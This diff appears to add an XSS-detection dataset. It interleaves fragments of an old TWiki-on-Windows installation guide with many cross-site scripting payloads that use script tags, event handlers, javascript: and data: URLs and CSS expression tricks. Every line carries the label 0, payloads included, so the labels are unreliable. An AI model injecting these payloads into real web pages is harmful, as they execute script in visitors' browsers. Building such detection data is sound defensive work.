@@ -1,0 +1,200 @@
+'><frame src='JaVaScRiPt:alert(1)'><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+Specify <code><b>c:\</b></code> as the installation directory - this actually installs Apache into <code><b>c:\apache</b></code> (if you specify <code>c:\apache</code>	0
+; alert(); /* <h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1><tr><td>minutes</td></tr> */	0
+<img src=x onErRor=alert`1`;><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+' /><frame src='javascript:alert`1`;'><!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+Another useful command is <code>apache -k stop</code>.	0
+<![CDATA['><script>alert`1`</script><!--]]><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+Type <code>perl -v</code> - you should see cygwin mentioned in the first line, and the Perl version, 5.6.1	0
+<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/new.gif" border="0" alt="NEW" width="28" height="8" />	0
+ onmouSemoVe=alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
+<a href="http://twiki.org/cgi-bin/view/Support.TwikiOnWindowsBinaryAttachments" title="'Support.TwikiOnWindowsBinaryAttachments' on TWiki site, we know it!">TWiki:Support</a>.	0
+<strong><em>NOTE</em></strong>: The Apache package itself requires a download of around 2 MB, and up to 10 MB of free disk space once installed.	0
+<s><script>alert`1`</script> <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+; alert``; /* <h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1><tr><td>minutes</td></tr> */	0
+<strong>4. Install Cygwin</strong>	0
+<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>Component</strong> </th><th bgcolor="#99CCCC">	0
+data:text/html,<script>alert(1)</script>Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> creates a bullet list of all topics.	0
+<tr><td> Unix tools </td><td> Cygwin 1.3.9 </td><td> Simplest way to get a whole set of required tools </td></tr>	0
+<h2><a name="Installing_Components"> Installing Components </a></h2>	0
+<iframe src=# onmouseover='alert`1`'></iframe><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<tr><td> Operating System </td><td> Windows 2000 </td><td> Should also work for Windows NT </td></tr>	0
+'onMouseMove='alert`1`;' 'onFocusOut='alert`1` /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+If you have an older version of any component, do yourself a favour and <strong>upgrade it</strong> as part of the install process.	0
+ onErRor=alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
+Leave the radio button on <strong>Curr</strong> (Current)	0
+If you already have some of these add-ons installed, here's how to check the versions - this assumes you have	0
+Type <code><b>cat -v t</b></code> - you should see <code><b>hi</b></code> as the output	0
+a style=background:url(jaVaScRiPt:alert(1))  <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+ onmousemove=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
+<strong>3. Test Apache</strong>	0
+ onErRor=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
+<a href="http://www.apache.org/dist/httpd/Announcement.html" target="_top">this page</a>	0
+If you see filename errors, your <strong>mounts did not work</strong> for some reason - check your typing	0
+<code>nano</code>, a non-GUI editor, but if you prefer to use a GUI editor, you should first install PFE, a freeware editor that supports Unix format files. PFE is available	0
+<code>%STARTINCLUDE%</code>TWiki<style=background:url(javascript(1))	0
+Head to <a href="http://cygwin.com" target="_top">http://cygwin.com</a>, and click the <strong><em>Install Cygwin Now</em></strong> link.	0
+Type <code>grep home /etc/passwd</code> - you should see some output.	0
+It is <strong>very important</strong> that all lines in the output of <code>mount</code> say 'binmode' under Flags	0
+'><frame src='JaVaScRiPt:alert`1`'><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'oNcLiCk='alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+'oNcLiCk='alert`1`;' 'onFocus='alert`1` /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<div/style='width:expression(alert`1`)'>x</div><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<iframe src='javascript:alert`1`;'></iframe><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+a style=background:url(javascript:alert`1`)  <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+<code>register</code>, fixed minor typo in Cygwin binary mode section, after beta testing by	0
+'onMouseEnter='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+'onMouseUp='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<s oncut= alert`1`>a <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+<strong><em>NOTE</em></strong><code><b>instmsi.exe</b></code><a href="http://httpd.apache.org/dist/httpd/binaries/win32/" target="_top"></a>	0
+' /><frame src='jaVasCriPt:alert(1);'><!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+';!--'<XSS>=&{(1)}``\'	0
+javascript:alert(1)// <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <table></table><b>aaa</b><code>%TOPICLIST{" &nbsp; * web.name"}%</code> creates a bullet list of all topics.<a style=background:url(javascript:alert(1))	0
+On first page, accept the defaults (be sure that the <strong><em>default text file type is Unix</em></strong> to avoid problems with attachment uploads, and specify 'install for all users')	0
+<img src=JaVaScRiPt:alert(1)><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<code>wget</code> (optional, useful for Perl install and <a href="http://twiki.org/cgi-bin/view/Codev.ReadWriteOfflineWiki" title="'Codev.ReadWriteOfflineWiki' on TWiki site, we know it!">TWiki:Codev.ReadWriteOfflineWiki</a>)	0
+Launch the desktop icon - this runs the <code>bash</code> shell, which has command line editing features	0
+<iframe src='jaVaScRiPt:alert`1`;'></iframe><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'onMouseWheel='alert`1`' 'onMouseUp='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<strong>5. Test Cygwin</strong>	0
+The reason this matters is that <code><b>'\'</b></code> is a special character to Perl and other tools, so it's much easier to use <code><b>'/'</b></code> everywhere.	0
+<a href="http://twiki.org/cgi-bin/view/Codev.TWikiAlphaRelease" title="'Codev.TWikiAlphaRelease' on TWiki site, we know it!">TWiki:Codev.TWikiAlphaRelease</a>	0
+--><ScRipt>alert(1);</sCriPt><th align="center" bgcolor="#99CCCC"> <strong><a href="FileAttachment">Attachment</a>:</strong>	0
+3 Mar 2002 - minor update to include <code>uname -a</code> command to check Cygwin DLL version, and delete Apache config's PassEnv line	0
+' /><frame src='jaVasCriPt:alert`1`;'><!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+;alert(1); /* <h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1><tr><td>minutes</td></tr> */	0
+'<s>'><ScrIpt>alert(1)</sCriPt><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+It's a little known fact that you can use pathnames such as <code><b>c:/apache</b></code> almost everywhere in Windows - try it in a File Open dialogue box.	0
+><s><img src='jaVaScrIpT:alert(1)> <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+'onMouseMove='alert`1`;'	0
+Another good <a href="http://twiki.org/cgi-bin/view/Codev.OpenSource" title="'Codev.OpenSource' on TWiki site, we know it!">TWiki:Codev.OpenSource</a>	0
+''' style='background:url(jaVasCriPt:alert(1))' '	0
+Type <code><b>cd /twiki</b></code>	0
+<h2><a name="Pre_requisites_and_upgrades"> Pre-requisites and upgrades </a></h2>	0
+<tr><td> Web Server </td><td><a href="http://httpd.apache.org" target="_top">http://httpd.apache.org</a>, but <strong>don't</strong> use Apache 2.0 yet) </td></tr>	0
+</textarea><img src=x onErroR=alert`1`;><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'onMouseDown='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+' onmousEmovE=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<a href="http://cygwin.com/cygwin-ug-net/using-textbinary.html" target="_top">User Guide section</a> and this <a href="http://cygwin.com/faq/faq.html#SEC54" target="_top">FAQ entry</a>.	0
+'></iframe><ScrIpt>alert(1);</sCriPt><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+Now run the Cygwin <code>setup.exe</code> file - this will also install Perl and RCS in one fell swoop.	0
+<tr><td> RCS </td><td> Cygwin rcs-5.7-2 </td><td> Comes with Cygwin, includes a file corruption bugfix </td></tr>	0
+<strong><em>NOTE</em></strong>: The installer keeps a local copy of downloaded files, so it's easy to re-install without re-downloading.	0
+<a href="http://twiki.org/cgi-bin/" title="'Main.MaryDeMarco' on TWiki site, we know it!">TWiki:MaryDeMarco</a>	0
+--><ScRipt>alert`1`;</sCriPt><th align="center" bgcolor="#99CCCC"> <strong><a href="FileAttachment">Attachment</a>:</strong>	0
+Type <code>rcs -V</code> - you should see the RCS version, 5.7	0
+Head to <a href="http://twiki.org" target="_top">http://twiki.org</a>	0
+Clean up by doing <code>rm t</code>	0
+<s>><img src='javascript:alert`1`> <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+'><ScrIpt>alert`1`;</sCriPt><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+' onmousEmovE=alert`1`;  /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
+><s><img src='javascript:alert`1`> <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+<h3><a name="TWiki_part_2_"> TWiki (part 2) </a></h3>	0
+</textarea><sCriPt>alert`1`;</ScrIpt><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'></iframe><ScrIpt>alert`1`;</sCriPt><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'onMouseWheel='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<a onmouseover=alert`1`>XSS</a><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+If necessary, start apache, either as a Win2000 service (using Admin Tools | Computer Management, or by typing <code>apache -k start -n apache</code>	0
+<code>egrep</code> and <code>fgrep</code> on some Cygwin versions (fix from <a href="http://twiki.org/cgi-bin/view/Main.DavidLeBlanc" title="'Main.DavidLeBlanc' on TWiki site, we know it!">TWiki</a>)	0
+20 Jun 2002 - added creation of <code>c:/twiki</code> directory	0
+<a href="http://twiki.org/cgi-bin/view/Codev.WindowsInstallCookbookComments" title="'Codev.WindowsInstallCookbookComments' on TWiki site, we know it!">TWiki:Codev.WindowsInstallCookbookComments</a>	0
+Type <code><b>echo hi &gt;t</b></code>	0
+' oneRroR=alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<div style='left:exp/* */ression(alert`1`)'><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<q/oncopy=alert`1` <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+<s oncopy= alert`1`>a <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+<q/oncut=alert`1` <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+<a href="http://httpd.apache.org/" target="_top">http://httpd.apache.org/</a>	0
+' onmousEmovE=alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+TIP: When typing a directory or file name, hit the TAB key after the first few letters of the name - <code>bash</code> will 'complete' the name.	0
+'onMouseLeave='alert`1`;' 'onMouseOut='alert`1` /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+The file to download is <code><b></b></code>	0
+<a href="http://www.apache.org/dyn/closer.cgi" target="_top">http://www.apache.org/dyn/closer.cgi</a>	0
+<h3><a name="Apache"> Apache </a></h3>	0
+'; alert(); // <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+;alert(1);&#39; /* <h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1><tr><td>minutes</td></tr> */	0
+<h3><a name="The_Perl_environment"> The Perl environment </a></h3>	0
+If you need to use spaces in file names (not recommended), you <em>may</em><code>TWiki.cfg</code>	0
+'; alert``; // <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<div style='color:expression(alert`1`);'>a</div><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'onFocusOut='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<a href="http://www.cygwin.com/cygwin-ug-net/using.html" target="_top">Cygwin documentation</a> for more details on this.	0
+' onmousEmovE=alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
+<img src=x onErRor=alert(1);><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'onMouseLeave='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<code>apache -k restart -n apache</code> for Apache running as a Win2000 service (-n gives name of service)	0
+'oNcLiCk='alert(1)'; 'onFocus='alert(1) /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<code>ls</code>, <code>egrep</code>, and RCS tools that it (typically) launches with the <code>bash</code> shell.	0
+<iframe src='data:text/html,<script>alert`1`</script>'></iframe><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+ ' oneRroR=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<a onmouseover='alert`1`'>XSS</a><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<h3><a name="Text_editing"> Text editing </a></h3>	0
+';alert(1);' // <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<a href="http://twiki.org/cgi-bin/view/Codev.CygWin" title="'Codev.CygWin' on TWiki site, we know it!">TWiki:Codev.CygWin</a> is a Unix-like environment for Windows	0
+<<script>alert`1`;<</script><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<h3><a name="TWiki_part_1_"> TWiki (part 1) </a></h3>	0
+<strong>1. Download Apache</strong>	0
+If the lines for <code>C:\cygwin</code> directories do not, you should uninstall and then re-install Cygwin to ensure that binary attachment uploads will work.	0
+<code>apache -k restart</code> for standalone Apache process running in another window	0
+This configures <code>/twiki</code> (known as a 'mount point') to map onto <code>c:/twiki</code> and for that directory tree to always be in binary mode, and does the same for <code>/c</code>	0
+<b>mkdir /twiki /c c:/twiki</b>	0
+javascript:alert(1); // Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> creates a bullet list of all topics.	0
+<iframe src='jaVaScRiPt:alert(1);'></iframe><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<a href="http://twiki.org/cgi-bin/" title="'Codev.ActiveState' on TWiki site, we know it!">TWiki:Codev.ActiveState</a>	0
+' oneRroR=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<strong>2. Install Apache</strong>	0
+<h2><a name="Checking_versions"> Checking versions </a></h2>	0
+<ScrIpt>alert`1`;</SCript> <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+<b>aaaa<script<b></b><alert`1`</script </b><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<h3><a name="The_Cygwin_environment"> The Cygwin environment </a></h3>	0
+</textarea><img src=x onErroR=alert(1);><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+If you need to use spaces in file names (not recommended), put double quotes around the file name in the <code>httpd.conf</code>	0
+<h2><a name="Scope"> Scope </a></h2>	0
+javascript:alert`1`; // <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<object data='data:text/html,<script>alert`1`</script>'></object><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+Point your browser at <a href="http://yourdomain.com/" target="_top">http://yourdomain.com/</a> to see the Apache intro page.	0
+</textarea><sCriPt>alert(1);</ScrIpt><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<a onMoUseOver=alert`1`>XSS</a><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'onMouseOut='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+><s><img src='jaVaScrIpT:alert`1`> <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+If you see <code><b>hi^M</b></code> as output, <strong>your /twiki directory is not in binary mode</strong>	0
+For each package, make sure the <strong>New</strong> column in the installer has a version number under it. If it says 'Skip' or 'Keep'	0
+<b <script>alert`1`</script>0 <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+21 Apr 2002 - updates on download sizes and free disk space requirements, improved post-installation <a href="#Testing_your_TWiki_installation">testing</a>	0
+<h2><a name="The_Unix_Windows_Environment"> The Unix/Windows Environment </a></h2>	0
+<code>bash</code>	0
+<a onMoUseOver='alert(1)'>XSS</a><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<h3><a name="The_Apache_environment"> The Apache environment </a></h3>	0
+This setup is written to the Windows registry, so there's no need to put these commands into a <code>.profile</code> file. For more information on binary vs text mode, see this	0
+<a href="http://twiki.org/cgi-bin/view/Codev.TWikiOnWindowsKnownConfigurations" title="'Codev.TWikiOnWindowsKnownConfigurations' on TWiki site, we know it!">Configurations</a>	0
+a style=background:url(jaVaScRiPt:alert`1`)  <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
+'><ScrIpt>alert(1);</sCriPt><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+less c:/<i>your-apache-dir</i>/Announcement	0
+15 Jun 2002 - various notes on Cygwin installation and troubleshooting: use of 'Unix' as default text file type (i.e. for mounting <code>c:/cygwin</code> directories) is essential for binary attachment uploads to work properly	0
+<a href="http://twiki.org/cgi-bin/view/Codev.CookbookLineEndingProblems" title="'Codev.CookbookLineEndingProblems' on TWiki site, we know it!">TWiki:Codev.CookbookLineEndingProblems</a>	0
+Select <code>c:\download\cygwin-dist</code> as the local package directory, and suitable proxy settings, then pick a local mirror site	0
+<strong><em>NOTE</em></strong>: The mandatory packages require a download of about 12 MB - about half of this is Perl, which would be necessary even without Cygwin, and most of the rest is gcc	0
+ onerror=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
+<div style='left:expression(alert`1`)'><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+ onmouSemoVe=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
+<h3><a name="Cygwin_Unix_tools_Perl_and_RCS"> </a> Cygwin, Unix tools, Perl and RCS </h3>	0
+<a onMoUseOver='alert`1`'>XSS</a><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<a href="http://cygwin.com/faq/faq.html#SEC32" target="_top">Cygwin FAQ entry</a> and upgrade <code>libncurses5</code>.	0
+';alert(document.domain); // <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+'onFocus='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+'onMouseEnter='alert`1`;' 'onMouseDown='alert`1` /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<code>pcre</code> to list of Cygwin packages (required by <code>grep</code>)	0
+<h3><a name="Alternatives"> Alternatives </a></h3>	0
+<iframe src='x' style=width:exp/**/ressi/**/on(alert`1`)><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<strong>6. Configure Cygwin for binary mode</strong>	0
+'oNcLiCk='alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+'<s>'><img src='JaVaScRiPt:alert(1)'><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
+<a href="http://httpd.apache.org/docs/windows.html" target="_top">Installing Apache on Windows</a> and <a href="http://httpd.apache.org/docs/win_service.html" target="_top">Windows NT/2000 service</a>.	0
+The <a href="http://cygwin.com/cygwin-ug-net/cygwin-ug-net.html" target="_top">Cygwin User Guide</a> is well worth reading for some background on how Cygwin works.	0
+<tr><td> Perl </td><td> Cygwin perl-5.6.1-2 </td><td> Comes with Cygwin </td></tr>	0
+ ' oneRroR=alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
+<a href="http://twiki.org/cgi-bin/view/Codev.TWikiOnWindows" title="'Codev.TWikiOnWindows' on TWiki site, we know it!">TWiki:Codev.TWikiOnWindows</a>	0
+In the package list screen, hit the <strong>View</strong> button until you get an alphabetical list that says <strong>Full</strong> to the right of the button.	0
+<strong><em>This is very important - omitting this step leads to a partially working system that corrupts RCS files</em></strong>	0
+<i>: Cygwin DLL version is the number in 1.3.x format</i>	0
